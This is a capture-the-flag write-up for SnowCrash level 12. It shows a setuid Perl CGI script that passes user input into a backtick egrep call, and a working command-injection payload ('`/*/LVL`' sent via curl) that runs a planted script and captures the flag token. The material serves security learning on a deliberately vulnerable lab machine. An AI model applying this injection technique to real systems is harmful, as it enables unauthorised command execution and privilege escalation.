```
level12@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level12 level12  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level12 level12  220 Apr  3  2012 .bash_logout
-r-x------  1 level12 level12 3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
-r-x------  1 level12 level12  675 Apr  3  2012 .profile

level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));

level12@SnowCrash:~$ ./level12.pl
Content-type: text/html

..
```
We have another perl script which takes the first argument, transforms all its letters to uppercase, deletes all symbols after first whitespace and runs `egrep` command. This output line we will exploit but previous transformations require us to be tricky:

```
level12@SnowCrash:~$ vim /tmp/LVL

level12@SnowCrash:~$ cat /tmp/LVL
#!/bin/sh
getflag > /tmp/twelve

level12@SnowCrash:~$ chmod 777 /tmp/LVL

level12@SnowCrash:~$ ls -la /tmp/LVL
-rwxrwxrwx 1 level12 level12 32 Sep 21 22:03 /tmp/LVL

level12@SnowCrash:~$ curl localhost:4646?x='`/*/LVL`'
..

level12@SnowCrash:~$ cat /tmp/twelve
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
